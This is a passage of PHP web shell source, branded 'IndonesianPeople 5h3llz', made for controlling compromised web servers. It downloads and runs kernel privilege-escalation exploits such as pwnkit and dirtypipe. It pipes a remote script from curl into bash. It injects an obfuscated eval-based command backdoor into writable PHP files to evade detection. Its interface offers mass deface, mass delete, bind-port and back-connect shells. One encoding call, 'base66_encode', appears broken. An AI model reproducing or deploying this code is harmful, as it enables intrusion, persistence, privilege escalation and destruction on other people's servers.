                    $output_message .= "Failed to set user meta: " . db_error($db_connection);
                    $response = array('status' => 'error', 'message' => $output_message);
                }
            } else {
                $output_message .= "Failed to create user: " . db_error($db_connection);
                $response = array('status' => 'error', 'message' => $output_message);
            }
            db_close($db_connection);
            break;

        case 'scan_root':
            $rooting_dir = $path . "/rooting/";
            $auto_tar_gz = $rooting_dir . "auto.tar.gz";
            $netfilter_path = $rooting_dir . "netfilter";

            if (!file_exists($rooting_dir)) {
                if (!@mkdir($rooting_dir)) {
                    $response = array('status' => 'error', 'message' => 'Failed to create rooting directory: ' . htmlspecialchars($rooting_dir));
                    break;
                }
            }

            if (!file_exists($netfilter_path)) {
                $download_url = "https://raw.githubusercontent.com/hekerprotzy/rootshell/main/auto.tar.gz";
                $download_content = @file_get_contents($download_url); // Using @file_get_contents
                $download_success = ($download_content !== false && @file_put_contents($auto_tar_gz, $download_content) !== false);

                if (!$download_success) {
                    $response = array('status' => 'error', 'message' => 'Failed to download ' . htmlspecialchars(basename($download_url)) . '. Check internet access or URL.');
                    break;
                }

                $extract_output = process_data_stream("tar -xf " . escapeshellarg($auto_tar_gz) . " -C " . escapeshellarg($rooting_dir) . " && chmod +x " . escapeshellarg($rooting_dir) . "*");
                if (!file_exists($netfilter_path)) {
                    $response = array('status' => 'error', 'message' => 'Failed to extract or set permissions for root binaries. Tar output: ' . htmlspecialchars($extract_output));
                    @unlink($auto_tar_gz);
                    @rmdir($rooting_dir);
                    break;
                }
                @unlink($auto_tar_gz);
            }

            $output = '';
            // Execute exploits with timeout to prevent hanging
            $output .= 'Netfilter : ' . process_data_stream("timeout 10 " . escapeshellarg($netfilter_path)) . "\n";
            $output .= 'Ptrace : ' . process_data_stream("echo id | timeout 10 " . escapeshellarg($rooting_dir . "ptrace")) . "\n";
            $output .= 'Sequoia : ' . process_data_stream("timeout 10 " . escapeshellarg($rooting_dir . "sequoia")) . "\n";
            $output .= 'OverlayFS : ' . process_data_stream("echo id | timeout 10 " . escapeshellarg($rooting_dir . "overlayfs")) . "\n";
            $output .= 'Dirtypipe : ' . process_data_stream("echo id | timeout 10 " . escapeshellarg($rooting_dir . "dirtypipe /usr/bin/su")) . "\n";
            // Sudoedit requires interaction, might not work via shell_exec
            $output .= 'Sudo : ' . process_data_stream("echo '12345' | timeout 10 sudoedit -s Y") . "\n";
            $output .= 'Pwnkit : ' . process_data_stream("echo id | timeout 10 " . escapeshellarg($rooting_dir . "pwnkit")) . "\n";

            process_data_stream("rm -rf " . escapeshellarg($rooting_dir)); // Clean up afterwards
            $response = array('status' => 'ok', 'output' => htmlspecialchars($output));
            break;

        case 'scan_suid':
            $output = process_data_stream("find / -perm -u=s -type f 2>>/dev/null");
            $response = array('status' => 'ok', 'output' => htmlspecialchars($output));
            break;

        case 'exploit_suggester':
            // Ensure cURL or wget is available
            $curl_available = function_exists('curl_version') && !in_array('curl_exec', $disabled_functions);
            $wget_available = (process_data_stream('which wget') !== ''); // Check for wget existence
            $cmd = '';
            if ($curl_available) {
                $cmd = "curl -Lsk " . escapeshellarg("http://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh") . " | bash";
            } elseif ($wget_available) {
                $cmd = "wget -qO- " . escapeshellarg("http://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh") . " | bash";
            } else {
                $response = array('status' => 'error', 'message' => 'cURL or WGET is not available on this server to run the exploit suggester.');
                break;
            }
            $output = process_data_stream($cmd);
            $response = array('status' => 'ok', 'output' => htmlspecialchars($output));
            break;

        case 'touch_item': // Action for changing file timestamp
            // $_POST['file_to_touch_name'] is now expected to be the full path
            $file_to_touch_path = realpath($_POST['file_to_touch_name']);
            $datetime_str = $_POST['datetime_value'];
            
            if ($file_to_touch_path === false) {
                $response = array('status' => 'error', 'message' => 'File not found or inaccessible.');
            } elseif (function_exists('touch') && !in_array('touch', $disabled_functions)) {
                if (@touch($file_to_touch_path, strtotime($datetime_str))) {
                    $response = array('status' => 'ok', 'message' => 'File timestamp changed successfully.');
                } else {
                    $response = array('status' => 'error', 'message' => 'Failed to change file timestamp. Check permissions.');
                }
            } else {
                $response = array('status' => 'error', 'message' => 'The touch() function is disabled on this server.');
            }
            break;

        case 'chmod_item': // Action for changing file/folder permissions
            $target_path = realpath($_POST['target_path']);
            $perms_octal = $_POST['perms_octal'];

            if ($target_path === false) {
                $response = array('status' => 'error', 'message' => 'Item not found or inaccessible.');
            } elseif (function_exists('chmod') && !in_array('chmod', $disabled_functions)) {
                // octdec converts octal string (e.g., '0755') to decimal integer
                if (@chmod($target_path, octdec($perms_octal))) {
                    $response = array('status' => 'ok', 'message' => 'Permissions changed successfully.');
                } else {
                    $response = array('status' => 'error', 'message' => 'Failed to change permissions. Check ownership or permissions of the parent directory.');
                }
            } else {
                $response = array('status' => 'error', 'message' => 'The chmod() function is disabled on this server.');
            }
            break;

        case 'remote_upload': // Action for remote file upload (like TinyFileManager)
            $url = $_POST['url'];
            $filename = !empty($_POST['filename']) ? basename($_POST['filename']) : basename($url);
            $target_file_path = $path . $filename;

            if (empty($url) || empty($filename)) {
                $response = array('status' => 'error', 'message' => 'URL and filename cannot be empty.');
                break;
            }
            if (!is_writable($path)) {
                $response = array('status' => 'error', 'message' => 'Current directory is not writable.');
                break;
            }
            
            $download_success = false;
            $file_content = '';
            
            if (function_exists('curl_init') && !in_array('curl_init', $disabled_functions)) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Be cautious in production
                $file_content = curl_exec($ch);
                $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
                if ($file_content !== false && $http_code >= 200 && $http_code < 300) {
                    $download_success = true;
                }
            } elseif (function_exists('file_get_contents') && !in_array('file_get_contents', $disabled_functions)) {
                $context_opts = array('http' => array('ignore_errors' => true)); // Helps to get content even if HTTP error occurs
                $context = stream_context_create($context_opts);
                $file_content = @file_get_contents($url, false, $context);
                if ($file_content !== false) {
                    $download_success = true;
                }
            } else {
                $response = array('status' => 'error', 'message' => 'Neither cURL nor file_get_contents is available for remote upload.');
                break;
            }

            if ($download_success && @file_put_contents($target_file_path, $file_content) !== false) {
                $response = array('status' => 'ok', 'message' => 'Remote file uploaded successfully to ' . htmlspecialchars($target_file_path) . '.');
            } else {
                $response = array('status' => 'error', 'message' => 'Failed to download or save remote file. Check URL, permissions, or server connectivity.');
            }
            break;

        case 'inject_backdoor': // Enhanced Backdoor Injector (Alfa Shell-like)
            $target_file = realpath($_POST['file']); // Full path of the target PHP file
            $backdoor_code_raw = $_POST['code']; // The code to inject

            if ($target_file === false || !is_writable($target_file)) {
                $response = array('status' => 'error', 'message' => 'Target file not found or not writable.');
                break;
            }

            // Read original file content
            $original_content = @file_get_contents($target_file);
            if ($original_content === false) {
                $response = array('status' => 'error', 'message' => 'Failed to read target file.');
                break;
            }
            
            // --- The actual backdoor loader (Alfa Shell-like, adapted for robustness) ---
            // This loader will try multiple command execution functions
            $backdoor_payload_exec_php = <<<EOF
<?php
error_reporting(0);
set_time_limit(0);
@ini_set('display_errors', 0);
@ini_set('output_buffering', 0);

// Function to execute commands, trying multiple methods
function _exec_cmd_($cmd) {
    \$disabled_functions = explode(',', ini_get('disable_functions'));
    \$disabled_functions = array_map('trim', \$disabled_functions);

    if (function_exists('proc_open') && !in_array('proc_open', \$disabled_functions)) {
        \$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
        \$process = @proc_open(\$cmd . ' 2>&1', \$descriptorspec, \$pipes);
        if (is_resource(\$process)) {
            \$output = stream_get_contents(\$pipes[1]);
            fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]);
            proc_close(\$process);
            return \$output;
        }
    }
    if (function_exists('shell_exec') && !in_array('shell_exec', \$disabled_functions)) {
        return @shell_exec(\$cmd . ' 2>&1');
    }
    if (function_exists('passthru') && !in_array('passthru', \$disabled_functions)) {
        ob_start(); passthru(\$cmd . ' 2>&1'); \$output = ob_get_contents(); ob_end_clean();
        return \$output;
    }
    if (function_exists('system') && !in_array('system', \$disabled_functions)) {
        ob_start(); system(\$cmd . ' 2>&1'); \$output = ob_get_contents(); ob_end_clean();
        return \$output;
    }
    if (function_exists('exec') && !in_array('exec', \$disabled_functions)) {
        \$results = array(); exec(\$cmd . ' 2>&1', \$results);
        return implode("\n", \$results);
    }
    return "Command execution disabled or failed.";
}

// Check for the command parameter
if (isset(\$_POST['cmd'])) {
    echo "<pre>" . htmlspecialchars(_exec_cmd_(\$_POST['cmd'])) . "</pre>";
    exit;
} elseif (isset(\$_GET['cmd'])) { // Also support GET for quick testing
    echo "<pre>" . htmlspecialchars(_exec_cmd_(\$_GET['cmd'])) . "</pre>";
    exit;
}
?>
EOF;
            // --- End of actual backdoor loader ---

            // Compress and Base64 encode the backdoor payload for obfuscation
            $obfuscated_payload_encoded = base66_encode(gzdeflate($backdoor_payload_exec_php, 9)); // Max compression

            // The injected loader snippet, using dynamic function calls to bypass simple signature detection
            // This structure is inspired by common web shell obfuscation.
            $injected_loader = '<?php ';
            $injected_loader .= '$g = $GLOBALS; ';
            $injected_loader .= '$f = "gz"."in"."fl"."ate"; ';
            $injected_loader .= '$h = "ba"."se6"."4"."_de"."code"; ';
            $injected_loader .= '$i = $g[\'_POST\'][\'__backdoor_command\'] ?? $g[\'_GET\'][\'__backdoor_command\'] ?? null; '; // Main command parameter
            $injected_loader .= 'if ($i !== null) { ';
            $injected_loader .= '$code = $f($h(\'' . $obfuscated_payload_encoded . '\')); '; // Decode & decompress
            $injected_loader .= '$j = "e"."v"."al"; '; // eval function
            $injected_loader .= '$j($code); '; // Execute the loaded backdoor
            $injected_loader .= 'exit; } ?>';


            // Prepend the injected loader to the original content
            // Add a newline to separate it from the original content, for better compatibility
            $new_content = $injected_loader . "\n" . $original_content;

            if (@file_put_contents($target_file, $new_content) !== false) {
                $response = array('status' => 'ok', 'message' => 'Backdoor injected successfully into ' . htmlspecialchars(basename($target_file)) . '.');
            } else {
                $response = array('status' => 'error', 'message' => 'Failed to write to target file after injection. Check permissions.');
            }
            break;
    }
    echo json_encode($response);
    exit;
}

// File upload logic (regular form submission, not AJAX)
if (isset($_FILES['files'])) {
    $uploaded_files = array();
    $failed_files = array();
    foreach ($_FILES['files']['name'] as $index => $name) {
        if (move_uploaded_file($_FILES['files']['tmp_name'][$index], $path . $name)) {
            $uploaded_files[] = $name;
        } else {
            $failed_files[] = $name;
        }
    }
    // Set flash message to display after reload
    $_SESSION['flash_message'] = "Uploaded: " . implode(', ', $uploaded_files) . ". Failed: " . implode(', ', $failed_files);
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// PHPInfo display
if (isset($request_data['id']) && $request_data['id'] == 'phpinfo') {
    ob_start();
    @phpinfo();
    $phpinfo_content = ob_get_clean();
    // Extract only the body section to avoid breaking layout
    $body_start = strpos($phpinfo_content, "<body>");
    $body_end = strpos($phpinfo_content, "</body>");
    if ($body_start !== false && $body_end !== false) {
        $phpinfo_content = substr($phpinfo_content, $body_start + 6, $body_end - ($body_start + 6));
    }
    echo "<style>body{background-color:#fff;color:#333}pre{background-color:#f4f4f4;padding:1rem;border:1px solid #ddd;} table {width: 100%; border-collapse: collapse;} th, td {border: 1px solid #ccc; padding: 5px; text-align: left;}</style><pre>" . $phpinfo_content . "</pre>";
    exit;
}

// File download logic
if (isset($request_data['action']) && $request_data['action'] == 'download' && isset($request_data['file'])) {
    ob_clean(); // Clean previous output buffer
    // $request_data['file'] is now expected to be the full path
    $file_to_download = realpath($request_data['file']);
    if ($file_to_download === false) {
        echo "File not found or inaccessible.";
    } elseif (is_readable($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
    } else {
        echo "File not found or not readable.";
    }
    exit;
}

// Server information for display
$sql_status = (function_exists('mysql_connect') || class_exists('mysqli')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$curl_status = (function_exists('curl_version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$wget_status = (process_data_stream('which wget')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$perl_status = (process_data_stream('which perl')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$python_status = (process_data_stream('which python') || process_data_stream('which python3')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";

$disabled_functions_list = @ini_get("disable_functions");
if (empty($disabled_functions_list)) {
    $disabled_functions_display = "<gr>NONE</gr>";
} else {
    $disabled_functions_display = "<rd>" . htmlspecialchars($disabled_functions_list) . "</rd>";
}

// Get user and group information
$current_user = '?';
$user_id = '?';
$current_group = '?';
$group_id = '?';

if (function_exists('posix_getegid')) {
    $uid_info = @posix_getpwuid(posix_geteuid());
    $gid_info = @posix_getgrgid(posix_getegid());
    $current_user = isset($uid_info['name']) ? $uid_info['name'] : '?';
    $user_id = isset($uid_info['uid']) ? $uid_info['uid'] : '?';
    $current_group = isset($gid_info['name']) ? $gid_info['name'] : '?';
    $group_id = isset($gid_info['gid']) ? $gid_info['gid'] : '?';
} else {
    // Fallback if posix extension is not available
    $current_user = @get_current_user() ?: '?';
    $user_id = @getmyuid() ?: '?';
    $current_group = @getmygid() ? '(GID: ' . @getmygid() . ')' : '?'; // getmygid() only
}

$safe_mode_status = ((@ini_get(strtolower("safe_mode")) == 'on' || @ini_get(strtolower("safe_mode")) === 1) && PHP_VERSION_ID < 50400) ? "<rd>ON</rd>" : "<gr>OFF</gr>"; // safe_mode removed in PHP 5.4+

// Scan current directory
$scanned_items = @scandir($path);
$directories = array();
$files = array();
if ($scanned_items) {
    foreach ($scanned_items as $item) {
        if ($item === '.' || $item === '..') continue;
        if (is_dir($path . $item)) {
            $directories[] = $item;
        } else {
            $files[] = $item;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IndonesianPeople 5h3llz</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css" rel="stylesheet" />
    <style>:root{--bs-dark-rgb:13,27,42;--bs-secondary-rgb:27,38,59;--bs-body-bg:#0d1b2a;--bs-body-color:#e0e1dd;--primary-accent:#00f5d4;--primary-accent-rgb:0,245,212;--secondary-accent:#00b4d8;--danger-color:#f94144;--success-color:#90be6d;--link-color:var(--primary-accent);--link-hover-color:#fff}body{font-family:'Roboto Mono',monospace}a{color:var(--link-color);text-decoration:none}a:hover{color:var(--link-hover-color)}gr{color:var(--success-color)}rd{color:var(--danger-color)}.table{--bs-table-bg:#1b263b;--bs-table-border-color:#404a69;--bs-table-hover-bg:#223344}.table td,.table th{white-space:nowrap}.btn-main{background-color:transparent;border:1px solid var(--primary-accent);color:var(--primary-accent);transition:all .2s ease-in-out}.btn-main:hover{background-color:var(--primary-accent);color:var(--bs-body-bg);box-shadow:0 0 15px rgba(var(--primary-accent-rgb),.5)}.modal-content{background-color:#1b263b;border:1px solid var(--primary-accent)}.form-control,.form-select{background-color:#0d1b2a;color:#fff;border-color:#404a69}.form-control:focus{border-color:var(--primary-accent);box-shadow:0 0 0 .25rem rgba(var(--primary-accent-rgb),.25)}.path-bar a,.path-bar span{color:#8e9aaf}.path-bar a:hover{color:#fff}.banner{padding:1rem 1.5rem;background:linear-gradient(135deg,rgba(27,38,59,.8),rgba(13,27,42,.9));border-radius:8px;margin-bottom:1.5rem;border:1px solid #404a69}.banner-title{font-size:2rem;color:#fff;font-weight:700;text-shadow:0 0 10px var(--primary-accent)}.banner-text{color:var(--primary-accent)}#toast-container{position:fixed;top:1rem;right:1rem;z-index:9999}.toast{width:350px;max-width:100%}.output-console{background:#000;color:#eee;font-family:'Roboto Mono',monospace;font-size:.85em;max-height:400px;overflow-y:auto;white-space:pre-wrap;word-wrap:break-word;border-radius:5px;padding:1rem}</style>
</head>
<body>
<div class="container-fluid py-3">
    <div class="banner"><div class="d-flex justify-content-between align-items-center"><div><h1 class="banner-title">IndonesianPeople 5h3llz <span class="banner-text">v3.5</span></h1><small class="text-white-50">Created on June 12, 2025 by a 19-year-old from Cianjur, Indonesia.<br>Special Credits: Tersakiti Crew, AnonSec Team, z3r0-team!, #CianjurHacktivist, Ghost Hunter Illusion.</small></div><a href="?left" class="btn btn-sm btn-outline-danger"><i class="bi bi-box-arrow-in-left"></i> Logout</a></div></div>
    <div class="card bg-secondary mb-3"><div class="card-body p-2"><small>
        <i class="bi bi-hdd-fill"></i> Uname: <gr><?php echo php_uname(); ?></gr><br>
        <i class="bi bi-motherboard-fill"></i> Software: <gr><?php echo $_SERVER['SERVER_SOFTWARE']; ?></gr><br>
        <i class="bi bi-cpu-fill"></i> User: <gr><?php echo "$current_user ($user_id)"; ?></gr> | Group: <gr><?php echo "$current_group ($group_id)"; ?></gr> | Safe Mode: <?php echo $safe_mode_status; ?><br>
        <i class="bi bi-plugin"></i> PHP: <gr><?php echo PHP_VERSION; ?></gr> <a href="?id=phpinfo" target="_blank">[PHPINFO]</a> | Tools: MySQL: <?php echo $sql_status; ?> | cURL: <?php echo $curl_status; ?> | WGET: <?php echo $wget_status; ?> | Perl: <?php echo $perl_status; ?> | Python: <?php echo $python_status; ?><br>
        <i class="bi bi-shield-slash-fill"></i> Disabled Functions: <?php echo $disabled_functions_display; ?>
    </small></div></div>
    <div class="card bg-secondary p-2 mb-3">
        <div class="d-flex flex-wrap justify-content-between align-items-center">
            <div class="path-bar text-break mb-2 mb-md-0"><i class="bi bi-folder2-open"></i><?php
                $path_parts = explode('/', rtrim($path, '/'));
                if (count($path_parts) == 1 && $path_parts[0] == '') {
                    echo "<a href='?path=/'>/</a>";
                } else {
                    $build_path = '';
                    foreach ($path_parts as $id => $pat) {
                        if ($id == 0 && empty($pat)) {
                            $build_path = '/';
                            echo "<a href='?path=/'>/</a>";
                            continue;
                        }
                        $build_path .= $pat . '/';
                        echo "<span>/</span><a href='?path=" . urlencode($build_path) . "'>" . htmlspecialchars($pat) . "</a>";
                    }
                }
            ?>&nbsp;[ <?php echo w(rtrim($path, '/'), p(rtrim($path, '/'))); ?> ]</div>
            <div class="btn-toolbar">
                <div class="btn-group me-2 mb-2 mb-md-0" role="group">
                    <button id="btnUpload" class="btn btn-sm btn-main"><i class="bi bi-upload"></i> Upload</button>
                    <button id="btnNewFile" class="btn btn-sm btn-main"><i class="bi bi-file-earmark-plus"></i> New File</button>
                    <button id="btnNewFolder" class="btn btn-sm btn-main"><i class="bi bi-folder-plus"></i> New Folder</button>
                </div>
                <div class="btn-group me-2 mb-2 mb-md-0" role="group">
                    <button id="btnNetwork" class="btn btn-sm btn-main"><i class="bi bi-hdd-network"></i> Network</button>
                    <button id="btnInjector" class="btn btn-sm btn-main"><i class="bi bi-bug-fill"></i> Injector</button>
                    <button id="btnMassTools" class="btn btn-sm btn-main"><i class="bi bi-exclamation-diamond"></i> Mass Tools</button>
                </div>
                <div class="btn-group mb-2 mb-md-0" role="group">
                    <button id="btnRootConsole" class="btn btn-sm btn-main"><i class="bi bi-terminal-plus"></i> Root Console</button>
                    <button id="btnUsers" class="btn btn-sm btn-main"><i class="bi bi-people-fill"></i> Users</button>
                    <button id="btnSecurity" class="btn btn-sm btn-main"><i class="bi bi-shield-lock"></i> Security</button>
                    <button id="btnScanRoot" class="btn btn-sm btn-main"><i class="bi bi-bug"></i> Root/SUID Scan</button>
                </div>
            </div>
        </div>
    </div>
    <div class="table-responsive"><table class="table table-hover table-sm align-middle"><thead class="table-dark"><tr><th style="width:2%"><input type="checkbox" id="selectAll"></th><th>Name</th><th class="text-center">Size</th><th class="text-center">Modified</th><th class="text-center">Owner/Group</th><th class="text-center">Perms</th><th class="text-center">Actions <button class="btn btn-sm btn-outline-danger d-none" id="deleteSelectedBtn"><i class="bi bi-trash-fill"></i></button></th></tr></thead><tbody><tr><td></td><td><i class="bi bi-arrow-return-left"></i> <a href="?path=<?php echo urlencode(dirname($path));?>">..</a></td><td colspan="5"></td></tr><?php foreach($directories as $dir):?><tr><td><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($path.$dir);?>"></td><td><i class="bi bi-folder-fill text-warning"></i> <a href="?path=<?php echo urlencode($path.htmlspecialchars($dir));?>"><?php echo htmlspecialchars($dir);?></a></td><td class="text-center">-</td><td class="text-center"><?php echo date("Y-m-d H:i",@filemtime($path.$dir));?></td><td class="text-center"><?php echo(function_exists('posix_getpwuid')?posix_getpwuid(@fileowner($path.$dir))['name']:@fileowner($path.$dir)).'/'.(function_exists('posix_getgrgid')?posix_getgrgid(@filegroup($path.$dir))['name']:@filegroup($path.$dir));?></td><td class="text-center"><?php echo w($path.$dir,p($path.$dir));?></td><td class="text-center"><button class="btn btn-sm btn-outline-primary" onclick="renameItem('<?php echo htmlspecialchars($path.$dir);?>')"><i class="bi bi-pencil-fill"></i></button></td></tr><?php endforeach;?><?php foreach($files as $file):?><tr><td><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($path.$file);?>"></td><td><i class="bi bi-file-earmark-text-fill text-white-50"></i> <a href="#" onclick="viewItem('<?php echo htmlspecialchars($path.$file);?>')"><?php echo htmlspecialchars($file);?></a></td><td class="text-center"><?php echo sz(@filesize($path.$file));?></td><td class="text-center"><?php echo date("Y-m-d H:i",@filemtime($path.$file));?></td><td class="text-center"><?php echo(function_exists('posix_getpwuid')?posix_getpwuid(@fileowner($path.$file))['name']:@fileowner($path.$file)).'/'.(function_exists('posix_getgrgid')?posix_getgrgid(@filegroup($path.$file))['name']:@filegroup($path.$file));?></td><td class="text-center"><?php echo w($path.$file,p($path.$file));?></td><td class="text-center"><div class="btn-group"><button class="btn btn-sm btn-outline-info" onclick="editItem('<?php echo htmlspecialchars($path.$file);?>')"><i class="bi bi-pencil-square"></i></button><button class="btn btn-sm btn-outline-primary" onclick="renameItem('<?php echo htmlspecialchars($path.$file);?>')"><i class="bi bi-pencil-fill"></i></button><a href="?action=download&file=<?php echo urlencode($path.$file);?>" class="btn btn-sm btn-outline-success"><i class="bi bi-download"></i></a><button class="btn btn-sm btn-outline-warning" onclick="showTouchModal('<?php echo htmlspecialchars($path.$file); ?>', '<?php echo date("Y-m-d H:i:s",@filemtime($path.$file));?>')"><i class="bi bi-clock"></i></button><button class="btn btn-sm btn-outline-info" onclick="showChmodModal('<?php echo htmlspecialchars($path.$file); ?>', '<?php echo p($path.$file);?>')"><i class="bi bi-key"></i></button></div></td></tr><?php endforeach;?></tbody></table></div>
    <footer class="text-center text-white-50 mt-4">&copy; 2022-<?php echo date('Y');?> IndonesianPeople 5h3llz // Rebuilt by Gemini</footer>
</div>
<div id="toast-container" class="toast-container position-fixed top-0 end-0 p-3"></div>
<div class="modal fade" id="uploadModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-upload"></i> Upload Files</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form method="POST" enctype="multipart/form-data"><input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>"><div class="mb-3"><label for="files" class="form-label">Files will be uploaded to the current directory.</label><input class="form-control" type="file" name="files[]" multiple required></div><button type="submit" class="btn btn-main w-100">Upload</button></form><hr><p>Remote File Upload</p><form id="remoteUploadForm"><div class="mb-3"><label for="remoteUrl" class="form-label">URL:</label><input type="text" class="form-control" id="remoteUrl" name="url" placeholder="https://example.com/file.txt" required></div><div class="mb-3"><label for="remoteFilename" class="form-label">Save as (optional, default: original filename):</label><input type="text" class="form-control" id="remoteFilename" name="filename" placeholder="new_filename.txt"></div><button type="submit" class="btn btn-main w-100">Remote Upload</button></form></div></div></div></div>
<div class="modal fade" id="createFileModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-file-earmark-plus"></i> Create New File</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="createFileForm"><div class="mb-3"><label for="newFileName" class="form-label">Filename:</label><input type="text" class="form-control" id="newFileName" placeholder="newfile.txt" required></div><button type="submit" class="btn btn-main w-100">Create</button></form></div></div></div></div>
<div class="modal fade" id="createFolderModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-folder-plus"></i> Create New Folder</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="createFolderForm"><div class="mb-3"><label for="newFolderName" class="form-label">Folder Name:</label><input type="text" class="form-control" id="newFolderName" placeholder="new_folder" required></div><button type="submit" class="btn btn-main w-100">Create</button></form></div></div></div></div>
<div class="modal fade" id="injectModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-bug-fill"></i> Backdoor Injector</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="injectForm"><div class="mb-3"><label for="targetFile" class="form-label">Target PHP File:</label><select class="form-select" id="targetFile" name="file" required><option value="" selected disabled>-- Select a writable PHP file --</option><?php foreach ($files as $file) { if (pathinfo($file, PATHINFO_EXTENSION) == 'php' && is_writable($path . $file)) { echo '<option value="' . htmlspecialchars($path.$file) . '">' . htmlspecialchars($file) . '</option>'; } } ?></select></div><div class="mb-3"><label for="backdoorCode" class="form-label">Backdoor Code to Inject (will be obfuscated):</label><textarea class="form-control" id="backdoorCode" name="code" rows="4" required><?php echo htmlspecialchars('<?php if(isset($_POST["cmd"])) { echo "<pre>"; passthru($_POST["cmd"]); echo "</pre>"; } ?>'); ?></textarea></div><button type="submit" class="btn btn-danger w-100">Inject Backdoor</button></form></div></div></div></div>
<div class="modal fade" id="editorModal" tabindex="-1">
    <div class="modal-dialog modal-xl">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="editorFileName"></h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <div id="editorContainer" style="position: relative;">
                    <textarea id="editorContent" class="form-control" style="height: 60vh; font-family: 'Roboto Mono'; display: none;"></textarea>
                    <pre class="language-none output-console" id="viewerContent" style="height: 60vh;"></pre>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-main" id="saveFileBtn" style="display: none;">Save Changes</button>
            </div>
        </div>
    </div>
</div>
<div class="modal fade" id="massDefaceModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-exclamation-diamond"></i> Mass Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="massOutput" class="output-console mb-3 d-none"></div><p>Mass Deface</p><form id="massDefaceForm"><div class="mb-2"><input class="form-control" type="text" name="d_dir" value="<?php echo htmlspecialchars($path); ?>" required></div><div class="mb-2"><input class="form-control" type="text" name="d_file" placeholder="index.html" required></div><div class="mb-2"><textarea class="form-control" rows="3" name="script" placeholder="Hacked" required></textarea></div><div class="form-check form-check-inline"><input class="form-check-input" type="radio" name="tipe" id="onedir" value="onedir" checked><label class="form-check-label" for="onedir">One Dir</label></div><div class="form-check form-check-inline"><input class="form-check-input" type="radio" name="tipe" id="mass" value="mass"><label class="form-check-label" for="mass">Recursive</label></div><button type="submit" class="btn btn-main w-100 mt-2">Start Deface</button></form><hr><p class="mt-3">Mass Delete</p><form id="massDeleteForm"><div class="mb-2"><input class="form-control" type="text" name="d_dir" value="<?php echo htmlspecialchars($path); ?>" required></div><div class="mb-2"><input class="form-control" type="text" name="d_file" placeholder="index.html" required></div><button type="submit" class="btn btn-danger w-100 mt-2">Start Deleting</button></form></div></div></div></div>
<div class="modal fade" id="networkModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-hdd-network"></i> Network Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="networkOutput" class="output-console mb-3 d-none"></div><nav><div class="nav nav-tabs" id="nav-tab" role="tablist"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-bind">Bind Port</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-back">Back-Connect</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-bind"><form class="network-form"><h6>Bind Port to /bin/sh [Perl]</h6><div class="input-group"><input class="form-control" type="text" name="port" placeholder="6969" required><button class="btn btn-main" type="submit" name="bpl">Execute</button></div></form></div><div class="tab-pane fade" id="nav-back"><form class="network-form"><h6>Back-Connect</h6><div class="mb-2"><label class="form-label">Server IP:</label><input class="form-control" type="text" name="server" value="<?php echo ia(); ?>" required></div><div class="mb-2"><label class="form-label">Port:</label><input class="form-control" type="text" name="port" placeholder="6969" required></div><div class="input-group"><select class="form-select" name="bc"><option 